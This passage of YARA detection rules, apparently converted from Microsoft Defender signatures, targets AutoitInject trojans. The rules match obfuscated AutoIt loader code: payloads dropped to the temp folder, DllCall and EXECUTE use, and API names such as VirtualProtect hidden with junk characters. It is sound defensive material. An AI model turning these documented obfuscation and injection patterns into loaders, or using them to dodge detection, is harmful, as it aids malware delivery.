        $x_1_1 = "PIGTJILCCRFX ( )" ascii //weight: 1
        $x_1_2 = "NQMEXYMXKQ ( )" ascii //weight: 1
        $x_1_3 = "CGRSLOXOCWMKA ( )" ascii //weight: 1
        $x_2_4 = "$AJUVSZFDWJFJ [ 2 ] = [ \"LmwIJMGUM\\LmwIJMGUM.exe\" , \"LmwIJMGUM\\" ascii //weight: 2
        $x_2_5 = "SHELLEXECUTE ( @WORKINGDIR & \"\\\" & $AJUVSZFDWJFJ [ $" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_KAE_2147920945_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.KAE!MTB"
        threat_id = "2147920945"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILEINSTALL" ascii //weight: 1
        $x_1_2 = "@TEMPDIR" ascii //weight: 1
        $x_1_3 = "DLLCALL" ascii //weight: 1
        $x_5_4 = "b30A022y30A022t30A022e30A022[30A022" ascii //weight: 5
        $x_7_5 = "k30A022e30A022r30A022n30A022e30A022l30A022330A022230A022.30A022d30A022l30A022l30A022" ascii //weight: 7
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_WZAA_2147921696_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.WZAA!MTB"
        threat_id = "2147921696"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TempDir" ascii //weight: 1
        $x_1_2 = "DLLCALL" ascii //weight: 1
        $x_2_3 = "kwqdfrowvewqdfrowvrwqdfrowvnwqdfrowvewqdfrowvlwqdfrowv3wqdfrowv2wqdfrowv" ascii //weight: 2
        $x_2_4 = "VwqdfrowviwqdfrowvrwqdfrowvtwqdfrowvuwqdfrowvawqdfrowvlwqdfrowvPwqdfrowvrwqdfrowvowqdfrowvtwqdfrowvewqdfrowvcwqdfrowvtwqdfrowv" ascii //weight: 2
        $x_2_5 = "uwqdfrowvswqdfrowvewqdfrowvrwqdfrowv3wqdfrowv2wqdfrowv" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMA_2147921787_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMA!MTB"
        threat_id = "2147921787"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 6b 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 65 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 72 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 6e 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 65 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 6c 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 33 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 32 00 35 00 64 00 74 00 78 00 48 00 66 00 34 00 35 00 [0-80] 22 00 20 00 29 00 20 00 2c 00 20 00 00 20 00 28 00 20 00 22 00}  //weight: 2, accuracy: Low
        $x_2_2 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-20] 20 28 20 22 6b 35 64 74 78 48 66 34 35 65 35 64 74 78 48 66 34 35 72 35 64 74 78 48 66 34 35 6e 35 64 74 78 48 66 34 35 65 35 64 74 78 48 66 34 35 6c 35 64 74 78 48 66 34 35 33 35 64 74 78 48 66 34 35 32 35 64 74 78 48 66 34 35 [0-80] 22 20 29 20 2c 20 00 20 28 20 22}  //weight: 2, accuracy: Low
        $x_1_3 = "u5dtxHf45s5dtxHf45e5dtxHf45r5dtxHf4535dtxHf4525dtxHf45" ascii //weight: 1
        $x_1_4 = "\"\"5dtxHf45\"\", \"\"\"\")\" )" ascii //weight: 1
        $x_1_5 = "@TEMPDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NF_2147921842_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NF!MTB"
        threat_id = "2147921842"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 3, accuracy: Low
        $x_1_3 = {57 00 48 00 49 00 4c 00 45 00 20 00 24 00 [0-48] 20 00 3c 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00}  //weight: 1, accuracy: Low
        $x_1_4 = {57 48 49 4c 45 20 24 [0-48] 20 3c 3d 20 53 54 52 49 4e 47 4c 45 4e 20 28}  //weight: 1, accuracy: Low
        $x_1_5 = {4c 00 4f 00 43 00 41 00 4c 00 20 00 24 00 [0-48] 20 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00 20 00 28 00}  //weight: 1, accuracy: Low
        $x_1_6 = {4c 4f 43 41 4c 20 24 [0-48] 20 3d 20 53 54 52 49 4e 47 4c 45 4e 20 28}  //weight: 1, accuracy: Low
        $x_1_7 = {4c 00 4f 00 43 00 41 00 4c 00 20 00 24 00 [0-48] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_8 = {4c 4f 43 41 4c 20 24 [0-48] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22}  //weight: 1, accuracy: Low
        $x_1_9 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 24 00 [0-48] 2e 00 4f 00 70 00 65 00 6e 00 54 00 65 00 78 00 74 00 46 00 69 00 6c 00 65 00 28 00 40 00 54 00 65 00 6d 00 70 00 44 00 69 00 72 00}  //weight: 1, accuracy: Low
        $x_1_10 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 24 [0-48] 2e 4f 70 65 6e 54 65 78 74 46 69 6c 65 28 40 54 65 6d 70 44 69 72}  //weight: 1, accuracy: Low
        $x_1_11 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 24 00 [0-48] 2e 00 52 00 65 00 61 00 64 00 41 00 6c 00 6c 00 28 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 24 [0-48] 2e 52 65 61 64 41 6c 6c 28 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_13 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 24 00 [0-48] 2e 00 43 00 6c 00 6f 00 73 00 65 00 28 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_14 = {45 58 45 43 55 54 45 20 28 20 22 24 [0-48] 2e 43 6c 6f 73 65 28 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_15 = "= EXECUTE ( \"ObjCreate(" ascii //weight: 1
        $x_1_16 = "&= STRINGMID" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((11 of ($x_1_*))) or
            ((1 of ($x_3_*) and 8 of ($x_1_*))) or
            ((2 of ($x_3_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NK_2147921846_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NK!MTB"
        threat_id = "2147921846"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-47] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-47] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 3, accuracy: Low
        $x_2_3 = {53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 50 00 4c 00 41 00 43 00 45 00 20 00 28 00 20 00 24 00 [0-48] 20 00 2c 00 20 00 22 00 39 00 35 00 30 00 30 00 31 00 35 00 37 00 38 00 39 00 22 00 20 00 2c 00 20 00 22 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {53 54 52 49 4e 47 52 45 50 4c 41 43 45 20 28 20 24 [0-48] 20 2c 20 22 39 35 30 30 31 35 37 38 39 22 20 2c 20 22 22 20 29}  //weight: 2, accuracy: Low
        $x_1_5 = "= DLLSTRUCTCREATE (" ascii //weight: 1
        $x_1_6 = "p950015789t950015789r950015789" ascii //weight: 1
        $x_1_7 = "k950015789e950015789r950015789n950015789e950015789l95001578939500157892950015789" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_3_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*) and 1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NM_2147921849_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NM!MTB"
        threat_id = "2147921849"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {53 00 61 00 76 00 65 00 54 00 6f 00 46 00 69 00 6c 00 65 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-47] 22 00 20 00 2c 00 20 00 32 00 20 00 29 00}  //weight: 3, accuracy: Low
        $x_3_2 = {53 61 76 65 54 6f 46 69 6c 65 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-47] 22 20 2c 20 32 20 29}  //weight: 3, accuracy: Low
        $x_2_3 = {57 00 72 00 69 00 74 00 65 00 20 00 28 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 20 00 28 00 20 00 24 00 [0-47] 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {57 72 69 74 65 20 28 20 42 49 4e 41 52 59 20 28 20 24 [0-47] 20 29 20 29}  //weight: 2, accuracy: Low
        $x_1_5 = {4c 00 4f 00 43 00 41 00 4c 00 20 00 24 00 [0-47] 20 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 4e 00}  //weight: 1, accuracy: Low
        $x_1_6 = {4c 4f 43 41 4c 20 24 [0-47] 20 3d 20 53 54 52 49 4e 47 4c 45 4e}  //weight: 1, accuracy: Low
        $x_1_7 = "&= STRINGLEFT ( " ascii //weight: 1
        $x_1_8 = "d9T0qwT5" ascii //weight: 1
        $x_1_9 = "pd9T0qwT5td9T0qwT5rd9T0qwT5" ascii //weight: 1
        $x_1_10 = "kd9T0qwT5ed9T0qwT5rd9T0qwT5nd9T0qwT5ed9T0qwT5ld9T0qwT53d9T0qwT52d9T0qwT5" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 6 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 5 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_3_*) and 4 of ($x_1_*))) or
            ((2 of ($x_3_*) and 1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*) and 2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_SKAL_2147922243_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKAL!MTB"
        threat_id = "2147922243"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-31] 20 00 3d 00 20 00 46 00 49 00 4c 00 45 00 4f 00 50 00 45 00 4e 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-31] 22 00 20 00 2c 00 20 00 [0-31] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {47 4c 4f 42 41 4c 20 24 [0-31] 20 3d 20 46 49 4c 45 4f 50 45 4e 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-31] 22 20 2c 20 [0-31] 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 43 00 4f 00 50 00 59 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 2c 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 [0-31] 20 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 43 4f 50 59 20 28 20 22 [0-31] 22 20 2c 20 24 [0-31] 20 2c 20 [0-31] 20}  //weight: 1, accuracy: Low
        $x_1_5 = {20 00 46 00 49 00 4c 00 45 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {20 46 49 4c 45 44 45 4c 45 54 45 20 28 20 22 [0-31] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {44 00 49 00 52 00 52 00 45 00 4d 00 4f 00 56 00 45 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 2c 00 20 00 [0-15] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {44 49 52 52 45 4d 4f 56 45 20 28 20 22 [0-31] 22 20 2c 20 [0-15] 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-31] 20 00 3d 00 20 00 44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 [0-31] 20 00 28 00 20 00 22 00 [0-31] 79 00 [0-31] 74 00 [0-31] 65 00 [0-31] 5b 00 [0-31] 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-31] 20 00 29 00 20 00 26 00 20 00 [0-31] 20 00 28 00 20 00 22 00 5d 00 [0-31] 22 00 20 00 29 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {47 4c 4f 42 41 4c 20 24 [0-31] 20 3d 20 44 4c 4c 53 54 52 55 43 54 43 52 45 41 54 45 20 28 20 [0-31] 20 28 20 22 [0-31] 79 [0-31] 74 [0-31] 65 [0-31] 5b [0-31] 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-31] 20 29 20 26 20 [0-31] 20 28 20 22 5d [0-31] 22 20 29 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win32_AutoitInject_YSAA_2147922653_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.YSAA!MTB"
        threat_id = "2147922653"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TempDir" ascii //weight: 1
        $x_1_2 = "DllCall" ascii //weight: 1
        $x_2_3 = "k8se0e8se0r8se0n8se0e8se0l8se038se028se0.8se0d8se0l8se0l8se0" ascii //weight: 2
        $x_2_4 = "V8se0i8se0r8se0t8se0u8se0a8se0l8se0P8se0r8se0o8se0t8se0e8se0c8se0t8se0" ascii //weight: 2
        $x_2_5 = "u8se0s8se0e8se0r8se038se028se0.8se0d8se0l8se0l8se0" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_YYAA_2147922990_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.YYAA!MTB"
        threat_id = "2147922990"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TempDir" ascii //weight: 1
        $x_1_2 = "DllCall" ascii //weight: 1
        $x_2_3 = "kwq90ewq90rwq90nwq90ewq90lwq903wq902wq90.wq90dwq90lwq90lwq90" ascii //weight: 2
        $x_2_4 = "Vwq90iwq90rwq90twq90uwq90awq90lwq90Pwq90rwq90owq90twq90ewq90cwq90twq90" ascii //weight: 2
        $x_2_5 = "uwq90swq90ewq90rwq903wq902wq90.wq90dwq90lwq90lwq90" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_SKAG_2147923005_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKAG!MTB"
        threat_id = "2147923005"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-31] 20 00 3d 00 20 00 46 00 49 00 4c 00 45 00 4f 00 50 00 45 00 4e 00 20 00 28 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-31] 22 00 20 00 2c 00 20 00 [0-31] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {47 4c 4f 42 41 4c 20 24 [0-31] 20 3d 20 46 49 4c 45 4f 50 45 4e 20 28 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-31] 22 20 2c 20 [0-31] 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 43 00 4f 00 50 00 59 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 2c 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 [0-31] 20 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 43 4f 50 59 20 28 20 22 [0-31] 22 20 2c 20 24 [0-31] 20 2c 20 [0-31] 20}  //weight: 1, accuracy: Low
        $x_1_5 = {20 00 46 00 49 00 4c 00 45 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {20 46 49 4c 45 44 45 4c 45 54 45 20 28 20 22 [0-31] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {44 00 49 00 52 00 52 00 45 00 4d 00 4f 00 56 00 45 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 2c 00 20 00 [0-15] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {44 49 52 52 45 4d 4f 56 45 20 28 20 22 [0-31] 22 20 2c 20 [0-15] 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Win32_AutoitInject_SKJ_2147923079_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SKJ!MTB"
        threat_id = "2147923079"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4c 00 4f 00 43 00 41 00 4c 00 20 00 24 00 [0-31] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 41 00 73 00 63 00 28 00 53 00 74 00 72 00 69 00 6e 00 67 00 4d 00 69 00 64 00 28 00 24 00 [0-31] 2c 00 20 00 24 00 [0-31] 2c 00 20 00 31 00 29 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 4f 43 41 4c 20 24 [0-31] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 41 73 63 28 53 74 72 69 6e 67 4d 69 64 28 24 [0-31] 2c 20 24 [0-31] 2c 20 31 29 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 00 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-31] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c 00 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 49 00 4c 00 45 00 44 00 45 00 4c 00 45 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 49 4c 45 44 45 4c 45 54 45 20 28 20 22 [0-31] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {46 00 49 00 4c 00 45 00 4f 00 50 00 45 00 4e 00 20 00 28 00 20 00 22 00 [0-31] 22 00 20 00 2c 00 20 00 [0-31] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {46 49 4c 45 4f 50 45 4e 20 28 20 22 [0-31] 22 20 2c 20 [0-31] 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {46 00 49 00 4c 00 45 00 43 00 4f 00 50 00 59 00 20 00 28 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 [0-31] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {46 49 4c 45 43 4f 50 59 20 28 20 24 [0-31] 20 2c 20 24 [0-31] 20 2c 20 [0-31] 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win32_AutoitInject_ZAAA_2147923083_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ZAAA!MTB"
        threat_id = "2147923083"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TempDir" ascii //weight: 1
        $x_1_2 = "DllCall" ascii //weight: 1
        $x_2_3 = "k0ewqe0ewqr0ewqn0ewqe0ewql0ewq30ewq20ewq.0ewqd0ewql0ewql0ewq" ascii //weight: 2
        $x_2_4 = "V0ewqi0ewqr0ewqt0ewqu0ewqa0ewql0ewqP0ewqr0ewqo0ewqt0ewqe0ewqc0ewqt0ewq" ascii //weight: 2
        $x_2_5 = "u0ewqs0ewqe0ewqr0ewq30ewq20ewq.0ewqd0ewql0ewql0ewq" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ZEAA_2147923305_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ZEAA!MTB"
        threat_id = "2147923305"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TempDir" ascii //weight: 1
        $x_1_2 = "DllCall" ascii //weight: 1
        $x_2_3 = "krqhverqhvrrqhvnrqhverqhvlrqhv3rqhv2rqhv.rqhvdrqhvlrqhvlrqhv" ascii //weight: 2
        $x_2_4 = "VrqhvirqhvrrqhvtrqhvurqhvarqhvlrqhvPrqhvrrqhvorqhvtrqhverqhvcrqhvtrqhv" ascii //weight: 2
        $x_2_5 = "urqhvsrqhverqhvrrqhv3rqhv2rqhv.rqhvdrqhvlrqhvlrqhv" ascii //weight: 2
        $x_2_6 = "CrqhvarqhvlrqhvlrqhvWrqhvirqhvnrqhvdrqhvorqhvwrqhvPrqhvrrqhvorqhvcrqhv" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_HNA_2147923318_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNA!MTB"
        threat_id = "2147923318"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 00 6c 00 6c 00 43 00 61 00 6c 00 6c 00 [0-240] 6b 00 ?? ?? [0-32] 65 00 01 02 72 00 01 02 6e 00 01 02 65 00 01 02 6c 00}  //weight: 1, accuracy: Low
        $x_1_2 = {44 6c 6c 43 61 6c 6c [0-240] 6b ?? ?? [0-32] 65 01 02 72 01 02 6e 01 02 65 01 02 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 [0-240] 6b 00 ?? ?? [0-32] 65 00 01 02 72 00 01 02 6e 00 01 02 65 00 01 02 6c 00}  //weight: 1, accuracy: Low
        $x_1_4 = {45 58 45 43 55 54 45 [0-240] 6b ?? ?? [0-32] 65 01 02 72 01 02 6e 01 02 65 01 02 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win32_AutoitInject_ZOAA_2147923541_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ZOAA!MTB"
        threat_id = "2147923541"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TempDir" ascii //weight: 1
        $x_1_2 = "DllCall" ascii //weight: 1
        $x_2_3 = "khxquehxqurhxqunhxquehxqulhxqu3hxqu2hxqu.hxqudhxqulhxqulhxqu" ascii //weight: 2
        $x_2_4 = "VhxquihxqurhxquthxquuhxquahxqulhxquPhxqurhxquohxquthxquehxquchxquthxqu" ascii //weight: 2
        $x_2_5 = "uhxqushxquehxqurhxqu3hxqu2hxqu.hxqudhxqulhxqulhxqu" ascii //weight: 2
    condition:
